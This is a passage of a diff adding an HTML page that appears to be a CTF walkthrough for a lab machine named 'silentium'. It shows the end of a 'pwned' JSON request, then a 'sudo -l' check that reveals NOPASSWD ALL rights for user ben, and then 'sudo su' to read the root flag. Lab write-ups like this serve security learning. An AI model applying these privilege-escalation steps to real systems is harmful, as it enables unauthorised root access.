+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="s1">  &quot;message&quot;: &quot;pwned&quot;,</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="s1">  &quot;sha&quot;: &quot;&lt;SHA&gt;&quot;</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="s1">}&#39;</span>
+</code></pre></div>
+<p>If you see then the exit like a json now try this in the <code>ssh</code> 
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ben@silentium:~$<span class="w"> </span>sudo<span class="w"> </span>-l
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>ben<span class="w"> </span>on<span class="w"> </span>silentium:
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,<span class="w"> </span>use_pty
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>User<span class="w"> </span>ben<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>silentium:
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>ALL
+</code></pre></div></p>
+<p>then only make <code>sudo su</code> and read the flag of root</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.indexes", "search.suggest", "search.highlight", "content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
